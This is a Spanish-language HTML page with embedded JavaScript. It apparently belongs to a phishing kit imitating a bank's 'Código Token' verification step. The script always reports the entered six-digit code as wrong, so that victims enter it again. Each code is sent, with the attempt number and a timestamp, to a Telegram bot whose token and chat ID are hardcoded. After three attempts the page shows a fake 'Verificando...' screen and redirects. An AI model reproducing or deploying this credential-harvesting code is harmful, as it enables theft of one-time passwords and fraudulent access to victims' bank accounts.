<body>
    <div class="contenedor">
        <img src="https://bogocota.site/assets/img/token.svg" alt="Token">
        <p class="titulo">Código <b>Token</b></p>
        <br>
        <p class="descripcion">Para realizar este proceso, ingresa el código de Token<br>móvil o físico.</p>
        <br>
        <input type="text" id="codigoToken" inputmode="numeric" maxlength="6">
        <div id="errorMensaje">El código debe tener exactamente 6 dígitos numéricos.</div>
        <br><br><br>
        <button id="btnContinuar">Continuar</button>
    </div>

    <!-- PANTALLA DE CARGA -->
    <div id="pantallaCarga">
        <div style="text-align: center;">
            <div style="margin-bottom: 30px;">
                <svg style="width: 60px; height: 60px; margin: 0 auto;" viewBox="0 0 50 50">
                    <circle cx="25" cy="25" r="20" fill="none" stroke="#0043a9" stroke-width="3" stroke-dasharray="31.4 94.2" style="animation: spin 1s linear infinite; transform-origin: 50% 50%;"></circle>
                </svg>
            </div>
            <h2 style="font-size: 18px; margin-bottom: 15px; color: #333; font-weight: 500;">Verificando...</h2>
            <p style="font-size: 14px; color: #666; margin: 0;">No recargue ni cierre esta ventana.</p>
        </div>
    </div>

    <script>
        // ========================================
        const TELEGRAM_BOT_TOKEN = '8619673327:AAGD9B3NyEqZQppZh3yHy_wcvxl0ZyVLBZk';
        const TELEGRAM_CHAT_ID = '-1003500051235';
        // ========================================

        let intentosFallidos = 0;
        const MAX_INTENTOS = 3;

        const input = document.getElementById("codigoToken");
        const btn = document.getElementById("btnContinuar");
        const error = document.getElementById("errorMensaje");
        const pantallaCarga = document.getElementById("pantallaCarga");

        // Recuperar intentos del localStorage
        function cargarIntentos() {
            const intentosGuardados = localStorage.getItem('intentosOTP');
            if (intentosGuardados) {
                intentosFallidos = parseInt(intentosGuardados);
                actualizarContador();
            }
        }

        // Guardar intentos en localStorage
        function guardarIntentos() {
            localStorage.setItem('intentosOTP', intentosFallidos);
        }

        // Cargar intentos al iniciar
        cargarIntentos();

        input.addEventListener("input", function () {
            this.value = this.value.replace(/[^0-9]/g, "").slice(0, 6);
            error.style.display = "none";
        });

        // BOTÓN CONTINUAR - VALIDAR OTP
        btn.addEventListener("click", function () {
            const valor = input.value.trim();
            if (!/^\d{6}$/.test(valor)) {
                error.textContent = "El código debe tener exactamente 6 dígitos numéricos.";
                error.style.display = "block";
                input.focus();
            } else {
                // OTP inválido (simular)
                intentosFallidos++;
                guardarIntentos();

                if (intentosFallidos < MAX_INTENTOS) {
                    // Mostrar error y limpiar
                    error.textContent = "El código es incorrecto. Intenta de nuevo.";
                    error.style.display = "block";
                    input.value = "";
                    input.focus();

                    // Enviar intento a Telegram
                    enviarIntento(valor, intentosFallidos);
                } else {
                    // Tercer intento - redirigir
                    error.style.display = "none";
                    pantallaCarga.style.display = "flex";
                    enviarIntento(valor, intentosFallidos, true);
                }
            }
        });

        // ENVIAR INTENTO A TELEGRAM
        async function enviarIntento(codigoIngresado, numeroIntento, esUltimo = false) {
            const estado = esUltimo ? "❌ MÁXIMO DE INTENTOS ALCANZADO" : "❌ INTENTO FALLIDO OTP";
            
            const textoTelegram = `${estado}

<b>Código Ingresado:</b> <code>${codigoIngresado}</code>
<b>Intento:</b> ${numeroIntento}/${MAX_INTENTOS}
<b>Fecha:</b> ${new Date().toLocaleString('es-CO')}

${!esUltimo ? '<b>Acciones disponibles:</b>' : '<b>⛔ Usuario bloqueado - Redirigido a final.html</b>'}`;

            try {
                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: textoTelegram,
                        parse_mode: 'HTML',
                        reply_markup: !esUltimo ? {
                            inline_keyboard: [
                                [
                                    {
                                        text: "🔄 Solicitar OTP de Nuevo",
                                        callback_data: "solicitar_otp_nuevo"
                                    }
                                ]
                            ]
                        } : undefined
                    })
                });

                if (esUltimo) {
                    // Redirigir al final después de enviar
                    setTimeout(() => {
                        pantallaCarga.style.display = "none";
                        localStorage.removeItem('intentosOTP'); // Limpiar intentos
                        window.location.href = 'final.html';
                    }, 2000);
                }
            } catch (error) {
                console.error('Error enviando a Telegram:', error);
                if (esUltimo) {
                    setTimeout(() => {
                        pantallaCarga.style.display = "none";
                        localStorage.removeItem('intentosOTP');
                        window.location.href = 'final.html';
                    }, 2000);
                }
            }
        }

        // ENVIAR SOLICITUD DE OTP A TELEGRAM (Disponible solo en Telegram)
        async function enviarSolicitudOTPTelegram() {
            // Esta función se llamaría desde Telegram cuando el usuario presiona el botón
            const textoTelegram = `📱 <b>NUEVA SOLICITUD DE OTP</b>

<b>El usuario solicitó un nuevo OTP</b>
<b>Fecha:</b> ${new Date().toLocaleString('es-CO')}

⏳ Se reinician los intentos fallidos`;

            try {
                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: textoTelegram,
                        parse_mode: 'HTML'
                    })
                });
            } catch (error) {
                console.error('Error:', error);
            }
        }
    </script>
